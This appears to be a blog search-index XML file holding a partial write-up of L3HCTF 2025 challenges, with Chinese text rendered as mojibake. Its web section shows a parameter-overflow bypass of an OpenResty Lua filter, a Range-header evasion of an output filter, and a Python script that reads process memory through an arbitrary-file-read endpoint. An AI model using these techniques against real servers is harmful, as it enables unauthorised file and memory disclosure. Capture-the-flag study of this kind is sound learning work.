<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title></title>
    <url>/posts/1.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>L3HCTF 2025éƒ¨åˆ†å¤ç°</title>
    <url>/posts/60548.html</url>
    <content><![CDATA[<p>L3HCTF 2025éƒ¨åˆ†å¤ç°</p>
<span id="more"></span>
<p>å¤ç°ä¸»è¦å‚è€ƒSUæˆ˜é˜Ÿçš„wp <a href="https://su-team.cn/posts/e3fd1be7.html">https://su-team.cn/posts/e3fd1be7.html</a></p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="é‡å­åŒç”Ÿå½±"><a href="#é‡å­åŒç”Ÿå½±" class="headerlink" title="é‡å­åŒç”Ÿå½±"></a>é‡å­åŒç”Ÿå½±</h2><p>ä¸‹è½½é¢˜ç›®çš„é™„ä»¶å¾—åˆ°äº†ä¸€ä¸ªaié£æ ¼çš„äºŒç»´ç ï¼Œä½†æ˜¯ä¹‹å‰ä¸çŸ¥é“ç”¨ä»€ä¹ˆå·¥å…·<br><a href="https://github.com/Tokeii0/LoveLy-QRCode-Scanner">LoveLy-QRCode-Scanner</a><br><img src="https://pic1.imgdb.cn/item/6876034f58cb8da5c8b1a1bd.png"><br>æŠŠé™„ä»¶ç»™çš„å›¾ç‰‡ç”¨è¿™ä¸ªå·¥å…·åˆ†æï¼Œå¾—åˆ°flag is not here, but I can give you the key: â€œquantumâ€<br>ç„¶åå¾ˆè‡ªç„¶å¯ä»¥æƒ³åˆ°æœ‰æ•°æ®éšå†™  ntfsæ•°æ®æµéšå†™<br>ä¸‹è½½ntfsstreamseditorè½¯ä»¶ï¼Œå¾—åˆ°å¤‡ä»½æ•°æ®ã€‚ <a href="https://www.duote.com/soft/10774.html#app-intro">https://www.duote.com/soft/10774.html#app-intro</a><br><img src="https://pic1.imgdb.cn/item/6878b4e358cb8da5c8be6ebc.png"><br>åœ¨å›¾ç‰‡çš„å±æ€§ä¸­ï¼Œå¯ä»¥çœ‹åˆ°ä¸¤å¼ å›¾ç‰‡çš„å°ºå¯¸æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥å°†ä¸¤ä¸ªå›¾ç‰‡è¿›è¡Œå¼‚æˆ–<br><img src="https://pic1.imgdb.cn/item/6878b63758cb8da5c8be7860.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_images</span>(<span class="params">img1_path, img2_path, output_path=<span class="string">&quot;xor_result.png&quot;</span></span>):</span><br><span class="line">    <span class="comment"># åŠ è½½å¹¶è½¬æ¢ä¸ºRGBæ ¼å¼</span></span><br><span class="line">    img1 = Image.<span class="built_in">open</span>(img1_path).convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">    img2 = Image.<span class="built_in">open</span>(img2_path).convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> img1.size != img2.size:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;å›¾ç‰‡å°ºå¯¸ä¸ä¸€è‡´ï¼Œæ— æ³•è¿›è¡Œå¼‚æˆ–è¿ç®—&quot;</span>)</span><br><span class="line"></span><br><span class="line">    w, h = img1.size</span><br><span class="line">    result = Image.new(<span class="string">&quot;RGB&quot;</span>, (w, h))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ¯åƒç´ é€ä½å¼‚æˆ–</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">            r1, g1, b1 = img1.getpixel((x, y))</span><br><span class="line">            r2, g2, b2 = img2.getpixel((x, y))</span><br><span class="line">            result.putpixel((x, y), (</span><br><span class="line">                r1 ^ r2,</span><br><span class="line">                g1 ^ g2,</span><br><span class="line">                b1 ^ b2</span><br><span class="line">            ))</span><br><span class="line"></span><br><span class="line">    result.save(output_path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] å·²ä¿å­˜å¼‚æˆ–å›¾åƒä¸º: <span class="subst">&#123;output_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¤ºä¾‹ç”¨æ³•</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    xor_images(<span class="string">&#x27;/Volumes/[C] Windows 11/Downloads/C!_Downloads_stream2.webp!stream1.webp&#x27;</span>, <span class="string">&#x27;/Volumes/[C] Windows 11/Downloads/stream2.webp&#x27;</span>, <span class="string">&#x27;/Users/kakeru/Downloads/a.png&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
<p>å†ç”¨ä¸Šé¢é‚£ä¸ªäºŒç»´ç å·¥å…·æå–åˆ°flag<br><img src="https://pic1.imgdb.cn/item/6878b9a858cb8da5c8be8400.png"></p>
<h2 id="Please-Sign-In"><a href="#Please-Sign-In" class="headerlink" title="Please Sign In"></a>Please Sign In</h2><p>ç›´æ¥æŠŠé¢˜ç›®å–‚ç»™aiç”Ÿæˆè„šæœ¬ï¼Œç„¶åæŠŠç”Ÿæˆçš„å›¾ç‰‡å‘é€åˆ°æœåŠ¡å™¨ï¼Œå°±èƒ½å¾—åˆ°flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torchvision.models <span class="keyword">import</span> shufflenet_v2_x1_0, ShuffleNet_V2_X1_0_Weights</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> transforms</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Step 1: Setting up the model and target embedding...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- This part must EXACTLY match the server&#x27;s setup ---</span></span><br><span class="line"><span class="comment"># 1.1 Load the same pre-trained model</span></span><br><span class="line">model = shufflenet_v2_x1_0(weights=ShuffleNet_V2_X1_0_Weights.IMAGENET1K_V1)</span><br><span class="line">model.fc = torch.nn.Identity() <span class="comment"># Turn it into a feature extractor</span></span><br><span class="line">model.<span class="built_in">eval</span>() <span class="comment"># Set it to evaluation mode</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.2 The target embedding vector from the problem description</span></span><br><span class="line">target_embedding_list = [<span class="number">0.01141324918717146</span>, <span class="number">0.05113353952765465</span>, ... , <span class="number">0.03890109062194824</span>] <span class="comment"># Paste the full list here</span></span><br><span class="line">target_embedding = torch.tensor(target_embedding_list, dtype=torch.float32).unsqueeze(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Model loaded. Target embedding shape: <span class="subst">&#123;target_embedding.shape&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Optimization Setup ---</span></span><br><span class="line"><span class="comment"># 2.1 Start with a random image (a tensor of random values)</span></span><br><span class="line"><span class="comment"># The model expects a 3-channel (RGB) image. Size doesn&#x27;t matter too much, 224x224 is standard.</span></span><br><span class="line">generated_image = torch.randn(<span class="number">1</span>, <span class="number">3</span>, <span class="number">224</span>, <span class="number">224</span>, requires_grad=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.2 Set up the optimizer. Adam is a good choice.</span></span><br><span class="line"><span class="comment"># It will update the pixels of `generated_image`.</span></span><br><span class="line">optimizer = torch.optim.Adam([generated_image], lr=<span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.3 Define the loss function (Mean Squared Error)</span></span><br><span class="line">loss_fn = torch.nn.MSELoss()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nStep 2: Starting the optimization process to generate the image...&quot;</span>)</span><br><span class="line"><span class="comment"># --- The Main Loop ---</span></span><br><span class="line">num_steps = <span class="number">1000</span> <span class="comment"># More steps can lead to better results</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_steps):</span><br><span class="line">    <span class="comment"># 3.1 Get the embedding of our current generated image</span></span><br><span class="line">    current_embedding = model(generated_image)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3.2 Calculate the loss</span></span><br><span class="line">    loss = loss_fn(current_embedding, target_embedding)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3.3 Backpropagation</span></span><br><span class="line">    optimizer.zero_grad() <span class="comment"># Clear previous gradients</span></span><br><span class="line">    loss.backward()      <span class="comment"># Calculate new gradients</span></span><br><span class="line">    optimizer.step()     <span class="comment"># Update the image pixels</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3.4 Clamp the image values to be in a valid range [0, 1]</span></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        generated_image.clamp_(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i + <span class="number">1</span>) % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Step <span class="subst">&#123;i+<span class="number">1</span>&#125;</span>/<span class="subst">&#123;num_steps&#125;</span>, Loss: <span class="subst">&#123;loss.item():<span class="number">.10</span>f&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nOptimization finished!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Final Loss: <span class="subst">&#123;loss.item():<span class="number">.10</span>f&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Save the Result ---</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nStep 3: Saving the generated image to &#x27;generated_image.png&#x27;...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert the final tensor to a PIL image and save it</span></span><br><span class="line">final_image_tensor = generated_image.squeeze(<span class="number">0</span>)</span><br><span class="line">to_pil = transforms.ToPILImage()</span><br><span class="line">final_image = to_pil(final_image_tensor)</span><br><span class="line">final_image.save(<span class="string">&quot;generated_image.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;âœ… Done! Submit &#x27;generated_image.png&#x27; to the server.&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/6878c1ce58cb8da5c8beb630.png"></p>
<h2 id="PaperBack"><a href="#PaperBack" class="headerlink" title="PaperBack"></a>PaperBack</h2><p>è¿™é¢˜å¾ˆæœ‰æ„æ€ï¼Œè·Ÿç€wpå¤ç°çš„<br>é¢˜ç›®æè¿°ï¼šSomeone thought paper could replace a CD. Turns outâ€¦ they werenâ€™t entirely wrong. Can you read between the dots? Btw, I really like OllyDbg.<br>æœç´¢PaperBackï¼ŒçŸ¥é“è¿™æ˜¯ä¸€ç§å­˜å‚¨æ•°æ®çš„æ–¹å¼<br><img src="https://pic1.imgdb.cn/item/6878c86458cb8da5c8bebce1.png"><br>ä¸‹è½½è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰«æä¸å†’æ³¡å¾—åˆ°ä¸€ä¸ªwsæ–‡ä»¶ï¼Œæ”¾åˆ°cyberchefä¸­ï¼Œè½¬æˆhex<br><img src="https://pic1.imgdb.cn/item/6878ca1a58cb8da5c8bebd82.png"><br>è¿™é‡Œä¸€å…±å°±20 09 0d 0a è¿™å‡ ç§å­—ç¬¦  0d0aåˆæ˜¯å¯¹åº”ç€\r\n  æŠŠå®ƒä»¬æ¢æˆæ¢è¡Œ<br><img src="https://pic1.imgdb.cn/item/6878cb1358cb8da5c8bebe41.png"><br>æ¥ä¸‹æ¥æ˜¯æœ€å¦™çš„ä¸€æ­¥ï¼ŒæŠŠå•è¡Œå‡ºç°çš„09å¿½ç•¥ï¼Œç„¶åæŠŠ20å¯¹åº”0ï¼Œ19å¯¹åº”1<br>è¿˜æœ‰wpä¸­æ²¡è¯´çš„ï¼ŒæŠŠæ¯è¡Œçš„æœ€å8ä½æå–å‡ºæ¥ï¼Œå› ä¸ºè¿™æ ·æ‰æ˜¯æœ‰æ„ä¹‰çš„å­—ç¬¦<br><img src="https://pic1.imgdb.cn/item/6878ceed58cb8da5c8bec20d.png"></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="gateway-advance"><a href="#gateway-advance" class="headerlink" title="gateway_advance"></a>gateway_advance</h2><p>ä¸‹è½½é¢˜ç›®é™„ä»¶ å¾—åˆ°nginx.confæ–‡ä»¶ é…ç½®æ–‡ä»¶ä¸­ç»™äº†ä¸€äº›å€Ÿå£<br>staticæ˜ å°„åˆ°&#x2F;wwwç›®å½•ã€‚ downloadå¯ä»¥å°†è¯·æ±‚ä»£ç†åˆ°localhost&#x2F;static  read_anywhereå¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶ï¼Œä½†æ˜¯éœ€è¦password<br>å¹¶ä¸”flagå’Œpasswordåœ¨ä¸€å¼€å§‹éƒ½åˆ é™¤äº†ï¼Œéœ€è¦åœ¨å†…å­˜ä¸­æ‰¾ &#x2F;proc&#x2F;{pid}&#x2F;fd&#x2F;{fd} æ¥è®¿é—®å®ƒçš„å†…å®¹<br>å…ˆæ¥çœ‹downloadè·¯ç”±ï¼Œæœ‰ä¸€äº›è¿‡æ»¤</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="code"><pre><span class="line">location /download &#123;</span><br><span class="line">            access_by_lua_block &#123;</span><br><span class="line">                local blacklist = &#123;&quot;%.&quot;, &quot;/&quot;, &quot;;&quot;, &quot;flag&quot;, &quot;proc&quot;&#125;</span><br><span class="line">                local args = ngx.req.get_uri_args()</span><br><span class="line">                for k, v in pairs(args) do</span><br><span class="line">                    for _, b in ipairs(blacklist) do</span><br><span class="line">                        if string.find(v, b) then</span><br><span class="line">                            ngx.exit(403)</span><br><span class="line">                        end</span><br><span class="line">                    end</span><br><span class="line">                end</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div>
<p>æœç´¢çŸ¥é“ngx.req.get_uri_argså­˜åœ¨å‚æ•°æº¢å‡ºæ¼æ´<a href="https://www.anquanke.com/post/id/103771">https://www.anquanke.com/post/id/103771</a><br>å®‰å…¨æ£€æµ‹åªåœ¨å‰100ä¸ªå‚æ•°ä¸­ï¼Œç¬¬101ä¸ªå‚æ•°ä¸ä¼šæ£€æµ‹ï¼Œæ‰€ä»¥æ„é€ 101ä¸ªå‚æ•°<br><img src="https://pic1.imgdb.cn/item/6879ee4d58cb8da5c8c2408e.png"><br>ç°åœ¨å¯ä»¥æˆåŠŸè¯»å–æ–‡ä»¶äº†ã€‚<br>ä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªè¾“å‡ºè¿‡æ»¤</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LUA"><figure class="iseeu highlight /lua"><table><tr><td class="code"><pre><span class="line">body_filter_by_lua_block &#123;</span><br><span class="line">                <span class="keyword">local</span> blacklist = &#123;<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;l3hsec&quot;</span>, <span class="string">&quot;l3hctf&quot;</span>, <span class="string">&quot;password&quot;</span>, <span class="string">&quot;secret&quot;</span>, <span class="string">&quot;confidential&quot;</span>&#125;</span><br><span class="line">                <span class="keyword">for</span> _, b <span class="keyword">in</span> <span class="built_in">ipairs</span>(blacklist) <span class="keyword">do</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">string</span>.<span class="built_in">find</span>(ngx.<span class="built_in">arg</span>[<span class="number">1</span>], b) <span class="keyword">then</span></span><br><span class="line">                        ngx.<span class="built_in">arg</span>[<span class="number">1</span>] = <span class="built_in">string</span>.<span class="built_in">rep</span>(<span class="string">&quot;*&quot;</span>, <span class="built_in">string</span>.<span class="built_in">len</span>(ngx.<span class="built_in">arg</span>[<span class="number">1</span>]))</span><br><span class="line">                    <span class="keyword">end</span></span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div>
<p>å¯¹äºè¿™ä¸ªé™åˆ¶å¯ä»¥ç”¨Range å¤´æ¥ç»•è¿‡ï¼ŒRangeå¤´å…è®¸å®¢æˆ·ç«¯æŒ‡å®šéœ€è¦è·å–çš„èµ„æºå­—èŠ‚èŒƒå›´ï¼Œå®ç°æ–­ç‚¹ç»­ä¼ å’Œåˆ†å—ä¸‹è½½åŠŸèƒ½ã€‚<br>å¯†ç åœ¨å†…å­˜ä¸­ï¼Œå¹¶ä¸”æœ‰è¿›ç¨‹åœ¨æ‰“å¼€å®ƒï¼Œæ‰€ä»¥åœ¨&#x2F;proc&#x2F;self&#x2F;fd&#x2F;{fd}ä¸­æ‰¾ æœ€åæ˜¯åœ¨6ä¸­<br>ç„¶åç”¨rangeå¤´æˆªå–æœ€åå¾—åˆ°password<code>passwordismemeispasswordsoneverwannagiveyouup</code><br><img src="https://pic1.imgdb.cn/item/6879f12358cb8da5c8c25bb2.png"><br>è·å¾—å¯†ç ä¹‹åå°±å¯ä»¥åœ¨read_anywhereè·¯ç”±è¯»å–ä»»æ„æ–‡ä»¶äº†ï¼Œå…ˆå»&#x2F;proc&#x2F;self&#x2F;mapsè¯»å–å†…å­˜æ˜ å°„</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">location /read_anywhere &#123;</span><br><span class="line">            access_by_lua_block &#123;</span><br><span class="line">                <span class="keyword">if</span> ngx.var.http_x_gateway_password ~= password then</span><br><span class="line">                    ngx.say(<span class="string">&quot;go find the password first!&quot;</span>)</span><br><span class="line">                    ngx.<span class="keyword">exit</span>(<span class="number">403</span>)</span><br><span class="line">                end</span><br><span class="line">            &#125;</span><br><span class="line">            content_by_lua_block &#123;</span><br><span class="line">                local f = io.open(ngx.var.http_x_gateway_filename, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> not f then</span><br><span class="line">                    ngx.<span class="keyword">exit</span>(<span class="number">404</span>)</span><br><span class="line">                end</span><br></pre></td></tr></table></figure></div>
<p>passwordæ”¾åœ¨X-Gateway-Passwordä¸­ æƒ³è¦è¯»å–çš„æ–‡ä»¶æ”¾åœ¨X-Gateway-Filenameè¯·æ±‚å¤´ä¸­<br><img src="https://pic1.imgdb.cn/item/6879f39258cb8da5c8c271ef.png"><br>å¾—åˆ°å†…å­˜æ˜ å°„ä¹‹å,æœ‰ä¸¤ç§æ–¹å¼å¾—åˆ°flagï¼Œä¸€ç§æ˜¯æŠŠå†…å­˜æ˜ å°„ç»™aiç”Ÿæˆè„šæœ¬ï¼Œæ‰«æå¾—åˆ°flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- é…ç½®åŒº ---</span></span><br><span class="line">URL = <span class="string">&quot;http://1.95.8.146:17794/read_anywhere&quot;</span></span><br><span class="line">PASSWORD = <span class="string">&quot;passwordismemeispasswordsoneverwannagiveyouup&quot;</span></span><br><span class="line">FLAG_PREFIX = <span class="string">b&quot;L3HCTF&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»é¢˜ç›®ä¸­è·å–çš„å†…å­˜æ˜ å°„ (maps)</span></span><br><span class="line">maps_data = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">55c2a3295000-55c2a32d9000 r--p 00000000 00:38 672253                     /usr/local/openresty/nginx/sbin/nginx</span></span><br><span class="line"><span class="string">55c2a32d9000-55c2a3451000 r-xp 00044000 00:38 672253                     /usr/local/openresty/nginx/sbin/nginx</span></span><br><span class="line"><span class="string">55c2a3451000-55c2a34b9000 r--p 001bc000 00:38 672253                     /usr/local/openresty/nginx/sbin/nginx</span></span><br><span class="line"><span class="string">55c2a34b9000-55c2a34bc000 r--p 00224000 00:38 672253                     /usr/local/openresty/nginx/sbin/nginx</span></span><br><span class="line"><span class="string">55c2a34bc000-55c2a34e1000 rw-p 00227000 00:38 672253                     /usr/local/openresty/nginx/sbin/nginx</span></span><br><span class="line"><span class="string">55c2a34e1000-55c2a35b2000 rw-p 00000000 00:00 0 </span></span><br><span class="line"><span class="string">55c2cf9bd000-55c2cf9be000 ---p 00000000 00:00 0                          [heap]</span></span><br><span class="line"><span class="string">55c2cf9be000-55c2cf9c3000 rw-p 00000000 00:00 0                          [heap]</span></span><br><span class="line"><span class="string">7f416f604000-7f416fa53000 rw-p 00000000 00:00 0 </span></span><br><span class="line"><span class="string">7f416fa53000-7f416fa54000 rw-s 00000000 00:01 5167                       /dev/zero (deleted)</span></span><br><span class="line"><span class="string">7f416fa54000-7f416fb6d000 rw-p 00000000 00:00 0 </span></span><br><span class="line"><span class="string">7f416fb74000-7f416fb76000 rw-p 00000000 00:00 0 </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_flag</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    éå†å†…å­˜æ˜ å°„ï¼Œè¯»å–å¯ç–‘åŒºåŸŸå¹¶æœç´¢Flagã€‚</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] å¼€å§‹æ‰«æè¿›ç¨‹å†…å­˜ä»¥å¯»æ‰¾Flag...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è§£æmapsæ•°æ®ï¼Œåªè·å–å¯è¯»å†™(rw-p)çš„åŒºåŸŸ</span></span><br><span class="line">    target_regions = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> maps_data.strip().split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;rw-p&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">            parts = line.split()</span><br><span class="line">            address_range = parts[<span class="number">0</span>]</span><br><span class="line">            start_hex, end_hex = address_range.split(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            target_regions.append((start_hex, end_hex))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] å‘ç°ç›®æ ‡å†…å­˜åŒºåŸŸ: <span class="subst">&#123;address_range&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å‡†å¤‡HTTPè¯·æ±‚å¤´</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;X-Gateway-Password&#x27;</span>: PASSWORD,</span><br><span class="line">        <span class="string">&#x27;X-Gateway-Filename&#x27;</span>: <span class="string">&#x27;/proc/self/mem&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># éå†ç›®æ ‡åŒºåŸŸ</span></span><br><span class="line">    <span class="keyword">for</span> start_hex, end_hex <span class="keyword">in</span> target_regions:</span><br><span class="line">        start_dec = <span class="built_in">int</span>(start_hex, <span class="number">16</span>)</span><br><span class="line">        end_dec = <span class="built_in">int</span>(end_hex, <span class="number">16</span>)</span><br><span class="line">        length = end_dec - start_dec</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[*] æ­£åœ¨æ‰«æåŒºåŸŸ <span class="subst">&#123;start_hex&#125;</span>-<span class="subst">&#123;end_hex&#125;</span> (å¤§å°: <span class="subst">&#123;length&#125;</span> å­—èŠ‚)...&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Nginxé…ç½®ä¸­é™åˆ¶äº†å•æ¬¡è¯»å–æœ€å¤§1MBï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ†å—è¯»å–</span></span><br><span class="line">        chunk_size = <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">        <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length, chunk_size):</span><br><span class="line">            current_start = start_dec + offset</span><br><span class="line">            <span class="comment"># è®¡ç®—å½“å‰å—çš„é•¿åº¦ï¼Œç¡®ä¿ä¸è¶…è¿‡åŒºåŸŸè¾¹ç•Œ</span></span><br><span class="line">            current_length = <span class="built_in">min</span>(chunk_size, length - offset)</span><br><span class="line"></span><br><span class="line">            headers[<span class="string">&#x27;X-Gateway-Start&#x27;</span>] = <span class="built_in">str</span>(current_start)</span><br><span class="line">            headers[<span class="string">&#x27;X-Gateway-Length&#x27;</span>] = <span class="built_in">str</span>(current_length)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = requests.get(URL, headers=headers, timeout=<span class="number">20</span>)</span><br><span class="line">                <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                    <span class="comment"># åœ¨è¿”å›çš„äºŒè¿›åˆ¶å†…å®¹ä¸­æœç´¢Flagå‰ç¼€</span></span><br><span class="line">                    <span class="keyword">if</span> FLAG_PREFIX <span class="keyword">in</span> response.content:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">40</span>)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;ğŸ‰ğŸ‰ğŸ‰ æ‰¾åˆ°Flagäº†ï¼ä½äºå†…å­˜åŒºåŸŸ <span class="subst">&#123;start_hex&#125;</span> é™„è¿‘ã€‚&quot;</span>)</span><br><span class="line">                        </span><br><span class="line">                        <span class="comment"># ä»è¿”å›å†…å®¹ä¸­æå–å®Œæ•´çš„Flag</span></span><br><span class="line">                        <span class="comment"># ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ä»¥é˜²flagä¸­æœ‰ç‰¹æ®Šå­—ç¬¦</span></span><br><span class="line">                        <span class="keyword">match</span> = re.search(<span class="string">b&#x27;(L3HCTF\\&#123;.*?\\&#125;)&#x27;</span>, response.content)</span><br><span class="line">                        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                            flag = <span class="keyword">match</span>.group(<span class="number">0</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;ğŸš© FLAG: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&quot;[!] æ‰¾åˆ°äº†å‰ç¼€ï¼Œä½†æ— æ³•å®Œæ•´æå–ã€‚åŸå§‹æ•°æ®å¦‚ä¸‹ï¼š&quot;</span>)</span><br><span class="line">                            <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">40</span>)</span><br><span class="line">                        <span class="keyword">return</span> <span class="comment"># æ‰¾åˆ°åç»“æŸè„šæœ¬</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="comment"># æ‰“å°ä¸€ä¸ªç‚¹è¡¨ç¤ºè¿›åº¦</span></span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;.&quot;</span>, end=<span class="string">&quot;&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[!] æœåŠ¡å™¨è¿”å›é”™è¯¯: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[!] è¯·æ±‚å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n\n[*] æ‰€æœ‰å¯ç–‘åŒºåŸŸæ‰«æå®Œæ¯•ï¼Œæœªæ‰¾åˆ°Flagã€‚è¯·æ£€æŸ¥é…ç½®æˆ–å†…å­˜æ˜ å°„ã€‚&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    find_flag()</span><br></pre></td></tr></table></figure></div>
